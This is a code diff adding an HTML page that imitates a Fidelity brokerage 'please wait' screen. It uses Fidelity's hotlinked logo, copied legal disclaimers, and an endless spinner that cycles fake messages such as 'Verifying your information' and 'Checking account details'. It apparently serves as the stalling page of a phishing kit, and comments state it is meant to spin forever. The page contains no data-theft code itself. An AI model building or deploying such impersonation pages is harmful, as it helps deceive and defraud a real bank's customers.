@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+  <title>Fidelity · please wait</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background-color: #F9F7F5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ---- nav ---- */
+    .nav-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 12px 20px;
+      min-height: 64px;
+      padding: 8px 20px;
+      background-color: #ffffff;
+    }
+
+    .nav-bar .logo img {
+      height: 33px;
+      display: block;
+      max-width: 100%;
+    }
+
+    .nav-bar .nav-links {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+      list-style: none;
+      flex-wrap: wrap;
+    }
+
+    .nav-bar .nav-links a {
+      color: #333333;
+      text-decoration: none;
+      font-size: 16px;
+      font-weight: 600;
+      white-space: nowrap;
+    }
+
+    .nav-bar .nav-links a:hover {
+      color: #1a7a3c;
+      text-decoration: underline;
+    }
+
+    /* ---- wait section ---- */
+    .wait-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 60px 16px;
+      flex: 1 0 auto;
+      min-height: 400px;
+    }
+
+    .wait-card {
+      width: 100%;
+      max-width: 464px;
+      background-color: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12);
+      border: 1px solid #d0d0d0;
+      padding: 48px 32px;
+      text-align: center;
+    }
+
+    .wait-card h1 {
+      font-size: 26px;
+      font-weight: 700;
+      margin-bottom: 12px;
+      color: #1a1a1a;
+      letter-spacing: -0.3px;
+    }
+
+    .wait-card .subhead {
+      font-size: 15px;
+      color: #555;
+      margin-bottom: 36px;
+      line-height: 1.5;
+    }
+
+    /* ---- spinner (endless) ---- */
+    .spinner-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 32px;
+    }
+
+    .spinner {
+      width: 64px;
+      height: 64px;
+      border: 5px solid #e8e6e4;
+      border-top: 5px solid #1a7a3c;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      display: inline-block;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* ---- progress bar (optional visual) ---- */
+    .progress-container {
+      width: 100%;
+      max-width: 300px;
+      margin: 0 auto 24px;
+      background-color: #e8e6e4;
+      border-radius: 4px;
+      height: 6px;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 30%;
+      background: linear-gradient(90deg, #1a7a3c, #2e9e4a);
+      border-radius: 4px;
+      animation: progressPulse 2s ease-in-out infinite;
+    }
+
+    @keyframes progressPulse {
+      0% { width: 10%; }
+      50% { width: 70%; }
+      100% { width: 10%; }
+    }
+
+    /* ---- status messages (fading) ---- */
+    .status-message {
+      font-size: 14px;
+      color: #666;
+      margin-top: 8px;
+      min-height: 24px;
+      transition: opacity 0.5s;
+    }
+
+    .status-message .dot {
+      display: inline-block;
+      animation: dotPulse 1.4s infinite;
+      font-weight: 700;
+    }
+
+    .status-message .dot:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+    .status-message .dot:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+
+    @keyframes dotPulse {
+      0%, 20% { opacity: 0; }
+      40% { opacity: 1; }
+      100% { opacity: 1; }
+    }
+
+    /* ---- cancel button ---- */
+    .cancel-btn {
+      background: none;
+      border: none;
+      color: #1E3986;
+      font-size: 15px;
+      text-decoration: underline;
+      cursor: pointer;
+      padding: 8px 16px;
+      margin-top: 12px;
+      transition: color 0.2s;
+      font-family: inherit;
+    }
+
+    .cancel-btn:hover {
+      color: #0f2666;
+    }
+
+    /* ---- disclaimer ---- */
+    .disclaimer {
+      width: 100%;
+      max-width: 756px;
+      margin: 40px auto 0;
+      padding: 24px 16px 40px;
+      border-top: 1px solid #d0d0d0;
+      font-size: 13px;
+      color: #333333;
+    }
+
+    .disclaimer h2 {
+      font-size: 15px;
+      margin-bottom: 8px;
+      font-weight: 700;
+    }
+
+    .disclaimer a {
+      color: #1E3986;
+      text-decoration: underline;
+      word-break: break-word;
+    }
+
+    .disclaimer p {
+      margin-top: 12px;
+      line-height: 1.5;
+    }
+
+    .ext-icon {
+      font-size: 11px;
+      text-decoration: none;
+      display: inline-block;
+      margin-left: 2px;
+    }
+
+    /* ---- footer ---- */
+    .site-footer {
+      background-color: #ffffff;
+      padding: 20px 20px 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 6px;
+      margin-top: 28px;
+      border-top: 1px solid #e8e6e4;
+      width: 100%;
+    }
+
+    .site-footer .copyright,
+    .site-footer .footer-links,
+    .site-footer .us-only {
+      font-size: 13px;
+      color: #333333;
+      text-align: right;
+      line-height: 1.5;
+    }
+
+    .site-footer .footer-links a {
+      color: #333333;
+      text-decoration: underline;
+      white-space: nowrap;
+    }
+
+    .site-footer .footer-links a:hover {
+      color: #1a7a3c;
+    }
+
+    .site-footer .us-only {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+    }
+
+    /* ---- responsive ---- */
+    @media (max-width: 600px) {
+      .nav-bar {
+        padding: 8px 16px;
+        flex-direction: row;
+        align-items: center;
+      }
+      .nav-bar .nav-links {
+        gap: 16px;
+      }
+      .nav-bar .nav-links a {
+        font-size: 14px;
+      }
+      .wait-card {
+        padding: 36px 20px;
+        margin-top: 0;
+      }
+      .wait-card h1 {
+        font-size: 22px;
+      }
+      .spinner {
+        width: 52px;
+        height: 52px;
+        border-width: 4px;
+      }
+      .disclaimer {
+        padding: 20px 12px 32px;
+        margin-top: 28px;
+      }
+      .site-footer {
+        padding: 16px 16px 20px;
+        align-items: center;
+      }
+      .site-footer .copyright,
+      .site-footer .footer-links,
+      .site-footer .us-only {
+        text-align: center;
+        width: 100%;
+      }
+      .site-footer .footer-links {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 6px 10px;
+      }
+      .site-footer .footer-links a {
+        white-space: normal;
+      }
+      .wait-section {
+        padding: 40px 16px;
+        min-height: 300px;
+      }
+    }
+
+    @media (max-width: 400px) {
+      .nav-bar {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 8px;
+        padding: 12px 16px;
+      }
+      .nav-bar .nav-links {
+        gap: 12px;
+        flex-wrap: wrap;
+      }
+      .wait-card {
+        padding: 28px 16px;
+      }
+      .wait-card h1 {
+        font-size: 20px;
+      }
+      .spinner {
+        width: 44px;
+        height: 44px;
+        border-width: 4px;
+      }
+      .cancel-btn {
+        font-size: 14px;
+      }
+    }
+
+    @media (pointer: coarse) {
+      .cancel-btn {
+        padding: 10px 20px;
+        min-height: 44px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div>
+    <div class="nav-bar">
+      <div class="logo">
+        <img src="https://digital.fidelity.com/prgw/digital/signin/assets/images/Fid_Wordmark-Logo_Green.svg" alt="Fidelity">
+      </div>
+      <ul class="nav-links">
+        <li><a href="#">Security</a></li>
+        <li><a href="#">FAQs</a></li>
+      </ul>
+    </div>
+
+    <div class="wait-section">
+      <div class="wait-card">
+        <h1>Please wait</h1>
+        <div class="subhead">We're processing your request. This may take a moment.</div>
+
+        <!-- Endless spinner -->
+        <div class="spinner-container">
+          <div class="spinner" role="status" aria-label="Loading"></div>
+        </div>
+
+        <!-- Animated progress bar -->
+        <div class="progress-container">
+          <div class="progress-bar"></div>
+        </div>
+
+        <!-- Status message with animated dots -->
+        <div class="status-message" id="statusMessage">
+          Verifying your information
+          <span class="dot">.</span>
+          <span class="dot">.</span>
+          <span class="dot">.</span>
+        </div>
+
+        <!-- Cancel button -->
+        <button class="cancel-btn" id="cancelBtn">Cancel and return</button>
+      </div>
+
+      <div class="disclaimer">
+        <h2>Disclaimer</h2>
+        <a href="#">National Financial Services LLC Statement of Financial Condition <span class="ext-icon">&#8599;</span></a>
+        <p>
+          Use of this site involves the electronic transmission of personal financial information. Using this product is consent to such transmission of this information; such consent is effective at all times when using this site. Fidelity supports 128-bit
+          <a href="#">browser encryption <span class="ext-icon">&#8599;</span></a>.
+        </p>
+        <p>
+          Before investing, consider the funds&rsquo; investment objectives, risks, charges, and expenses. Contact Fidelity for a prospectus or, if available, a summary prospectus containing this information. Read it carefully.
+        </p>
+        <p>
+          Fidelity Brokerage Services LLC, Member NYSE, SIPC. 900 Salem Street, Smithfield, RI 02917
+        </p>
+        <p>1159659.2.0</p>
+      </div>
+    </div>
+
+    <div class="site-footer">
+      <div class="copyright">Copyright 1998-2026 FMR LLC. All rights reserved.</div>
+      <div class="footer-links">
+        <a href="#">Terms of Use <span class="ext-icon">&#8599;</span></a> |
+        <a href="#">Privacy Policy <span class="ext-icon">&#8599;</span></a> |
+        <a href="#">Security <span class="ext-icon">&#8599;</span></a> |
+        <a href="#">Accessibility <span class="ext-icon">&#8599;</span></a> |
+        <a href="#">Share Your Screen</a>
+      </div>
+      <div class="us-only">This is for persons in the U.S. only. <span class="ext-icon">&#8599;</span></div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // ---- Status messages rotation (endless loop) ----
+      const messages = [
+        'Verifying your information',
+        'Checking account details',
+        'Securing your connection',
+        'Almost there',
+        'Processing your request'
+      ];
+      
+      let messageIndex = 0;
+      const statusEl = document.getElementById('statusMessage');
+      
+      // Function to update status message with dots
+      function updateStatusMessage(text) {
+        statusEl.innerHTML = text + 
+          ' <span class="dot">.</span>' +
+          ' <span class="dot">.</span>' +
+          ' <span class="dot">.</span>';
+      }
+      
+      // Rotate messages every 4 seconds (endless)
+      function rotateMessages() {
+        messageIndex = (messageIndex + 1) % messages.length;
+        updateStatusMessage(messages[messageIndex]);
+      }
+      
+      // Start with first message
+      updateStatusMessage(messages[0]);
+      
+      // Rotate every 4 seconds (endless)
+      const messageInterval = setInterval(rotateMessages, 4000);
+
+      // ---- Cancel button ----
+      const cancelBtn = document.getElementById('cancelBtn');
+      
+      cancelBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        
+        // Ask for confirmation before canceling
+        if (confirm('Are you sure you want to cancel and return?')) {
+          clearInterval(messageInterval);
+          alert('⏹️ Cancelled. Returning to previous page (demo).');
+          // In a real app, you'd redirect or go back
+          // window.history.back();
+        }
+      });
+
+      // ---- Simulate a "complete" after a very long time (just for demo) ----
+      // In reality, this page would just keep spinning endlessly,
+      // but we'll show a demo completion after 30 seconds for fun
+      // (comment this out if you want truly endless)
+      /*
+      setTimeout(() => {
+        // Only if not cancelled
+        if (document.body.contains(statusEl)) {
+          statusEl.innerHTML = '⏳ Still working on it...';
+          // Keep spinning
+        }
+      }, 15000);
+      */
+
+      // ---- Handle page unload (cleanup) ----
+      window.addEventListener('beforeunload', function() {
+        clearInterval(messageInterval);
+      });
+
+      // ---- Also allow escape key to cancel ----
+      document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape') {
+          cancelBtn.click();
+        }
+      });
+
+      // ---- Demo: Log message for debugging ----
+      console.log('⏳ Wait page active - spinner spinning endlessly');
+      console.log('💡 Press ESC or click "Cancel and return" to cancel');
+
+    })();
+  </script>
+</body>
+</html>
